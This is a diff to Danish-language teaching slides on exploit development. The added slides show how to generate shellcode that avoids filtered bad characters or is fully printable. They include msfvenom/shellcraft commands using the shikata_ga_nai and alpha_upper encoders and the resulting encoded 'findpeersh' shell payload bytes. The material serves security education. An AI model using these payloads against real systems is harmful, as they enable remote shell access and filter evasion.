@@ -138,14 +138,55 @@ image:../images/required_constants-solution.png[width="800"]
 
 Udfordringer - Filtre (bad chars)
 ---------------------------------
+[source,bash]
+------------------------------------------------
+ 6) Avoid certain chars
+------------------------------------------------
 [source,c]
 ------------------------------------------------
 include::../assignments/avoid_chars[]
 ------------------------------------------------
 
+Udfordringer - Filtre (bad chars)
+---------------------------------
+image:../images/encoder_decoder.png[]
+
+Udfordringer - Filtre (bad chars)
+---------------------------------
+[source,bash]
+------------------------------------------------
+$ shellcraft i386.linux.findpeersh | msfvenom --encoder x86/shikata_ga_nai --bad-chars '\x00\x0a\x0d\x20\x3d\x3b' --arch x86 --platform linux --format py
+buf =  ""
+buf += "\xba\x33\xb9\x97\x19\xda\xde\xd9\x74\x24\xf4\x58\x29"
+buf += "\xc9\xb1\x10\x83\xe8\xfc\x31\x50\x10\x03\x50\x10\xd1"
+buf += "\x4c\xfd\xe6\x7f\xa8\x8b\xfc\x24\xe8\xe1\x98\x82\x52"
+buf += "\x7b\x28\x16\xbb\xe9\xb5\x36\xf6\x6e\x30\x76\x69\x35"
+buf += "\x4e\x9b\xe3\x3a\xda\x60\xad\xf5\x71\x59\x15\xcb\x06"
+buf += "\xd0\x5d\xb9\x6e\x72\xb1\x11\x40\xf1\xa5\x42\xfc\x9c"
+buf += "\x5b\x14\xe3\x6f\x6d\x4c\xef\xd7\xf4\x5c\x6f"
+------------------------------------------------
+
 Udfordringer - Printable
 ------------------------
+[source,bash]
+------------------------------------------------
+ 7) Shellcode needs to be printable
+------------------------------------------------
 [source,c]
 ------------------------------------------------
 include::../assignments/printable_shellcode[]
+------------------------------------------------
+
+Udfordringer - Printable
+------------------------
+[source,bash]
+------------------------------------------------
+$ shellcraft i386.linux.findpeersh | msfvenom --encoder x86/alpha_upper --arch x86 --platform linux BufferRegister=EAX
+Attempting to read payload from STDIN...
+Found 1 compatible encoders
+Attempting to encode payload with 1 iterations of x86/alpha_upper
+x86/alpha_upper succeeded with size 185 (iteration=0)
+x86/alpha_upper chosen with final size 185
+Payload size: 185 bytes
+PYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJISZKOSZDGK9ZEQK1N3ZBF1HPFLMPL6DM0RJS4E08MMPMUIP3Q1J45ZMMYKCCZC3V9PICZGOV88MMPRUL8BJE8SXFO6O6OBSE8FOU2RIBNLIJCP1IY2J4KPXJ9XMK0AA
 ------------------------------------------------
